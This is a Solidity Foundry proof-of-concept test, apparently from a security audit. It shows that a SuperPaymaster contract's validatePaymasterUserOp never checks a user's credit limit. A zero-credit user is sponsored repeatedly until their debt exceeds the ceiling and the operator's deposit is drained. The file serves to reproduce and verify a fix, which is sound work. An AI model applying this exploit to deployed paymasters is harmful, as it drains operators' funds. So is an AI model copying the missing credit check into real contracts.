// PoC_C01 — Credit ceiling
// VULNERABILITY: validatePaymasterUserOp never enforces getCreditLimit, allowing debt to exceed a user's credit ceiling.
// TEST PASSES = vulnerability exists on current code
// TEST SHOULD FAIL/REVERT after fix
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "src/paymasters/superpaymaster/v3/SuperPaymaster.sol";
import "src/tokens/xPNTsToken.sol";
import "@account-abstraction-v7/interfaces/IEntryPoint.sol";
import "@account-abstraction-v7/interfaces/IPaymaster.sol";
import "@account-abstraction-v7/interfaces/PackedUserOperation.sol";
import "@openzeppelin-v5.0.2/contracts/proxy/Clones.sol";
import "@openzeppelin-v5.0.2/contracts/token/ERC20/ERC20.sol";
import {UUPSDeployHelper} from "../helpers/UUPSDeployHelper.sol";
import {MockXPNTsFactory} from "../helpers/MockXPNTsFactory.sol";

contract C01Registry {
    mapping(bytes32 => mapping(address => bool)) public roles;
    mapping(address => uint256) public creditLimits;

    function setRole(bytes32 role, address account, bool value) external {
        roles[role][account] = value;
    }

    function hasRole(bytes32 role, address account) external view returns (bool) {
        return roles[role][account];
    }

    function setCreditLimit(address user, uint256 limit) external {
        creditLimits[user] = limit;
    }

    function getCreditLimit(address user) external view returns (uint256) {
        return creditLimits[user];
    }
}

contract C01EntryPoint {}

contract C01PriceFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 2000 * 1e8, 0, block.timestamp, 1);
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }
}

contract C01APNTs is ERC20 {
    constructor() ERC20("aPNTs", "aPNT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract PoC_C01_CreditCeiling_Test is Test {
    using Clones for address;

    SuperPaymaster public paymaster;
    C01Registry public registry;
    C01EntryPoint public entryPoint;
    C01APNTs public apnts;
    xPNTsToken public xpnts;
    MockXPNTsFactory public mockFactory;

    address public owner = address(0xC0101);
    address public treasury = address(0xC0102);
    address public operator = address(0xC0103);
    address public user = address(0xC0104);

    bytes32 public constant C01_ROLE_PAYMASTER_SUPER = keccak256("PAYMASTER_SUPER");
    bytes32 public constant C01_ROLE_COMMUNITY = keccak256("COMMUNITY");
    uint256 public constant MAX_COST = 1_000;

    function setUp() public {
        vm.startPrank(owner);

        registry = new C01Registry();
        entryPoint = new C01EntryPoint();
        apnts = new C01APNTs();
        C01PriceFeed priceFeed = new C01PriceFeed();

        paymaster = UUPSDeployHelper.deploySuperPaymasterProxy(
            IEntryPoint(address(entryPoint)),
            IRegistry(address(registry)),
            address(priceFeed),
            owner,
            address(apnts),
            treasury,
            3600
        );

        vm.warp(block.timestamp + 2 hours);
        paymaster.updatePrice();

        address xImpl = address(new xPNTsToken());
        xpnts = xPNTsToken(xImpl.clone());
        xpnts.initialize("Community Points", "xPNT", owner, "Community", "community.eth", 1e18);
        xpnts.setSuperPaymasterAddress(address(paymaster));

        mockFactory = new MockXPNTsFactory();
        paymaster.setXPNTsFactory(address(mockFactory));
        mockFactory.setToken(operator, address(xpnts));

        registry.setRole(C01_ROLE_PAYMASTER_SUPER, operator, true);
        registry.setRole(C01_ROLE_COMMUNITY, operator, true);
        registry.setCreditLimit(user, 0);

        apnts.mint(operator, 10_000 ether);
        vm.stopPrank();

        vm.prank(address(registry));
        paymaster.updateSBTStatus(user, true);

        vm.startPrank(operator);
        apnts.approve(address(paymaster), type(uint256).max);
        paymaster.configureOperator(address(xpnts), treasury);
        paymaster.deposit(1_000 ether);
        vm.stopPrank();

        assertEq(xpnts.balanceOf(user), 0, "setup: user must have no xPNTs");
        assertEq(registry.getCreditLimit(user), 0, "setup: user credit ceiling must be zero");
    }

    function test_PoC_validateDoesNotEnforceCreditCeiling() public {
        uint128 operatorBefore = _operatorBalance();

        for (uint256 i = 1; i <= 3; i++) {
            PackedUserOperation memory op;
            op.sender = user;
            op.paymasterAndData = _paymasterData();

            bytes32 opHash = bytes32(i);
            vm.prank(address(paymaster.entryPoint()));
            (bytes memory context, uint256 validationData) = paymaster.validatePaymasterUserOp(op, opHash, MAX_COST);
            assertEq(uint160(validationData), 0, "validate unexpectedly rejected zero-credit user");

            vm.prank(address(paymaster.entryPoint()));
            paymaster.postOp(IPaymaster.PostOpMode.opSucceeded, context, MAX_COST, 0);
        }

        uint256 debt = xpnts.getDebt(user);
        uint256 creditLimit = registry.getCreditLimit(user);

        assertGt(debt, creditLimit, "debt must exceed zero credit ceiling");
        assertLt(_operatorBalance(), operatorBefore, "operator balance must be drained by sponsored debt");
    }

    function _paymasterData() internal view returns (bytes memory) {
        return abi.encodePacked(address(paymaster), uint256(MAX_COST), operator, type(uint256).max);
    }

    function _operatorBalance() internal view returns (uint128 balance) {
        (balance,,,,,,,,) = paymaster.operators(operator);
    }
}
